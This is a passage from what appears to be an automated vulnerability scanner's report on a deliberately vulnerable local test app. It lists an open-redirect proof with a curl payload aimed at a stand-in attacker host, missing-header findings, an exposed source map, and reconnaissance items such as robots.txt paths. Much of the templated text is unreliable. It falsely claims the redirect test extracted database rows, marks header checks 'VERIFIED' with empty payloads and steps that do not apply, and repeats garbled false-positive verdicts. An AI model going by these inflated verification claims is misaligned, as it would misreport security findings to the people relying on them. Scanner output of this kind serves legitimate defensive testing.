**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'url=https://bughound-evil.example/' 'http://127.0.0.1:8081/go'
```

**Raw HTTP exchange:**

```http
GET /go?url=https%3A%2F%2Fbughound-evil.example%2F HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 307

date: Wed, 23 Sep 2026 14:20:07 GMT
server: uvicorn
content-length: 0
location: https://bughound-evil.example/


```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/go in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: https://bughound-evil.example/
4. Observe that the browser is redirected off your domain to the attacker URL.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Redirect only to allowlisted relative paths; reject absolute external URLs.

### 24. [MEDIUM] Missing Content-Security-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-693
- **Module:** security-headers

**Description.** No CSP header. CSP is a key defense-in-depth control against XSS and data injection.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'content-security-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Define a restrictive Content-Security-Policy (e.g. default-src 'self').

### 25. [MEDIUM] Missing HSTS (Strict-Transport-Security)

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-319
- **Module:** security-headers

**Description.** No HSTS header, so browsers may downgrade to HTTP and are exposed to SSL-strip attacks.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'strict-transport-security'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Strict-Transport-Security: max-age=63072000; includeSubDomains; preload over HTTPS.

### 26. [MEDIUM] Page can be framed (clickjacking)

- **Class:** Clickjacking
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-1021
- **Module:** security-headers

**Description.** Neither X-Frame-Options nor a CSP frame-ancestors directive is set, so the page can be embedded in a hostile iframe for clickjacking.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
No X-Frame-Options header and no frame-ancestors in CSP.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Set X-Frame-Options: DENY (or SAMEORIGIN) and/or CSP frame-ancestors 'none'.

### 27. [MEDIUM] Exposed source map: http://127.0.0.1:8081/static/app.js.map

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/static/app.js.map
- **Injection point:** `GET /static/app.js.map`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-540
- **Module:** sourcemap-exposure

**Description.** The minified JavaScript file http://127.0.0.1:8081/static/app.js ships a sourceMappingURL comment and the .map file is publicly accessible. This leaks the original (un-minified) source code, file paths, and sometimes inline secrets or API keys not stripped from the original source.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 142-151), inside **app_js_map**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      137 | //# sourceMappingURL=/static/app.js.map
      138 | """
      139 | 
      140 | 
      141 | @app.get("/static/app.js.map", response_class=PlainTextResponse)
  ->  142 | def app_js_map() -> str:
      143 |     # Recon breadcrumb: a publicly accessible source map.
      144 |     return json.dumps({
      145 |         "version": 3,
      146 |         "file": "app.js",
      147 |         "sources": ["../src/app.js", "../src/internal.js"],
```

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
sourcesCount=2; sample sources: ../src/app.js, ../src/internal.js
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Disable sourcemap generation in production builds, or serve .map files only on an internal / authenticated path.

### 28. [MEDIUM] HTTP not redirected to HTTPS

- **Class:** TLS / Transport Security
- **URL:** http://127.0.0.1/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-319
- **Module:** tls

**Description.** Plain HTTP is served without redirecting to HTTPS; traffic can be intercepted.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1/ -> 0, Location: none
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Redirect all HTTP to HTTPS and enable HSTS.

### 29. [MEDIUM] POST form without anti-CSRF token

- **Class:** Cross-Site Request Forgery (CSRF)
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** confidence: tentative (exploit attempted)
- **CWE:** CWE-352
- **Module:** advisory

**Description.** A state-changing form has no visible CSRF token; verify CSRF protection.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
<form action='/transfer' method=post> has no token field.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Add per-session/per-request CSRF tokens or use SameSite cookies + origin checks.

### 30. [LOW] Missing X-Content-Type-Options: nosniff

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-16
- **Module:** security-headers

**Description.** Without nosniff, browsers may MIME-sniff responses, enabling some XSS vectors.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'x-content-type-options'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send X-Content-Type-Options: nosniff.

### 31. [LOW] Missing Permissions-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-732
- **Module:** security-headers

**Description.** No Permissions-Policy; the page (or any iframe embedding it) can use powerful browser features (camera, microphone, geolocation, payment, USB) by default.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'permissions-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=().

### 32. [LOW] Missing Cache-Control

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-525
- **Module:** security-headers

**Description.** No Cache-Control header; sensitive responses may be cached by shared proxies or the browser, enabling access after logout / on shared devices.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'cache-control'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Cache-Control: no-store (or no-cache, must-revalidate) for authenticated and sensitive responses.

### 33. [INFO] Harvested 1 email address(es) from client content

- **Class:** Reconnaissance / Attack-Surface Mapping
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED
- **CWE:** CWE-200
- **Module:** email-harvest

**Description.** Email addresses were found in HTML and / or same-origin JavaScript files. These are useful for OSINT, phishing simulation, username enumeration, and may also indicate internal naming conventions.

**Detection evidence.**

```
admin@example.com
```

**Remediation.** Avoid publishing individual email addresses in client content; prefer a contact form or shared inbox.

### 34. [INFO] Server advertises 6 HTTP method(s): GET, POST, OPTIONS, PUT, DELETE, TRACE

- **Class:** Reconnaissance / Attack-Surface Mapping
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED
- **Module:** http-methods

**Description.** An OPTIONS request returned an Allow / Public header listing the HTTP methods the server accepts. This shapes which active tests are worth running.

**Detection evidence.**

```
OPTIONS http://127.0.0.1:8081/ -> Allow: GET, POST, OPTIONS, PUT, DELETE, TRACE
```

**Remediation.** Restrict the Allow header to methods the application actually uses.

### 35. [INFO] Technology disclosed via 'server' header

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET / -> request parameter 'server'`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** info-disclosure

**Description.** The 'server' header reveals server/framework details useful to an attacker.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
server: uvicorn, nginx/1.18.0 (Ubuntu)
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove or obfuscate the 'server' response header.

### 36. [INFO] Technology disclosed via 'x-powered-by' header

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET / -> request parameter 'x-powered-by'`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** info-disclosure

**Description.** The 'x-powered-by' header reveals server/framework details useful to an attacker.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
x-powered-by: Express
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove or obfuscate the 'x-powered-by' response header.

### 37. [INFO] security.txt (informational)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/.well-known/security.txt
- **Injection point:** `GET /.well-known/security.txt`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-538
- **Module:** info-disclosure

**Description.** A sensitive resource is publicly accessible at .well-known/security.txt.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 159-162), inside **security_txt**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      154 |     # Recon breadcrumb: an exposed admin panel.
      155 |     return "<html><body><h1>Admin Panel</h1><form><input name='password'/></form></body></html>"
      156 | 
      157 | 
      158 | @app.get("/.well-known/security.txt", response_class=PlainTextResponse)
  ->  159 | def security_txt() -> str:
      160 |     return "Contact: mailto:security@example.com\nExpires: 2026-12-31T23:59:59Z\n"
      161 | 
      162 | 
      163 | @app.get("/search", response_class=HTMLResponse)
      164 | def search(q: str = "") -> str:
```

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/.well-known/security.txt -> 200; body starts: 'Contact: mailto:security@example.com\nExpires: 2026-12-31T23:59:59Z\n'
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Block access to VCS/backup/config files at the web server and remove them from webroot.

### 38. [INFO] Extracted 3 endpoint path(s) from 1 JS file(s)

- **Class:** Reconnaissance / Attack-Surface Mapping
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED
- **CWE:** CWE-200
- **Module:** js-endpoints

**Description.** Same-origin JavaScript files reference API / internal paths that are not linked from HTML. These are valuable targets for the active phase: many contain unauthenticated endpoints, debug routes, or admin functionality.

**Detection evidence.**

```
/api/internal/health
/api/v1/orders
/api/v1/users
```

**Remediation.** Minify and remove inline API references; serve debug builds only on internal environments.

### 39. [INFO] robots.txt discloses 2 hidden path(s)

- **Class:** Reconnaissance / Attack-Surface Mapping
- **URL:** http://127.0.0.1:8081/robots.txt
- **Injection point:** `GET /robots.txt`
- **Status:** VERIFIED
- **Module:** robots-sitemap

**Description.** robots.txt explicitly lists paths the operator wants hidden from crawlers -- these are prime targets for further testing since 'hidden' often implies sensitive.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 114-118), inside **robots**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      109 |     r.headers["x-powered-by"] = "Express"
      110 |     return r
      111 | 
      112 | 
      113 | @app.get("/robots.txt", response_class=PlainTextResponse)
  ->  114 | def robots() -> str:
      115 |     # Recon breadcrumb: robots.txt explicitly hides /admin and /private.
      116 |     return "User-agent: *\nDisallow: /admin\nDisallow: /private\nSitemap: /sitemap.xml\n"
      117 | 
      118 | 
      119 | @app.get("/sitemap.xml", response_class=PlainTextResponse)
```

**Detection evidence.**

```
/admin
/private
```

**Remediation.** Do not rely on robots.txt to enforce access control; ensure hidden paths are protected server-side.

### 40. [INFO] security.txt published (RFC 9116)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/.well-known/security.txt
- **Injection point:** `GET /.well-known/security.txt`
- **Status:** VERIFIED (exploit attempted)
- **Module:** robots-sitemap

**Description.** A security.txt file is published, disclosing the vulnerability disclosure policy and security contact (mailto:security@example.com).

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 159-162), inside **security_txt**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      154 |     # Recon breadcrumb: an exposed admin panel.
      155 |     return "<html><body><h1>Admin Panel</h1><form><input name='password'/></form></body></html>"
      156 | 
      157 | 
      158 | @app.get("/.well-known/security.txt", response_class=PlainTextResponse)
  ->  159 | def security_txt() -> str:
      160 |     return "Contact: mailto:security@example.com\nExpires: 2026-12-31T23:59:59Z\n"
      161 | 
      162 | 
      163 | @app.get("/search", response_class=HTMLResponse)
      164 | def search(q: str = "") -> str:
```

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Contact: mailto:security@example.com
Expires: 2026-12-31T23:59:59Z

```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Keep security.txt up to date and verify the listed contact.

**References.** https://www.rfc-editor.org/rfc/rfc9116.html

### 41. [INFO] Missing Referrer-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** security-headers

**Description.** No Referrer-Policy; referrer URLs may leak to third parties.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'referrer-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Referrer-Policy: no-referrer or strict-origin-when-cross-origin.

### 42. [INFO] Missing Cross-Origin-Embedder-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** security-headers

**Description.** Without COEP, the document cannot enable cross-origin isolation; shared resources can be loaded without explicit opt-in.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'cross-origin-embedder-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Cross-Origin-Embedder-Policy: require-corp (or credentialless) if the app needs SharedArrayBuffer / cross-origin isolation.

### 43. [INFO] Missing Cross-Origin-Opener-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** security-headers

**Description.** Without COOP, a malicious site can open the page in a popup and reach into its window object across origins.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'cross-origin-opener-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

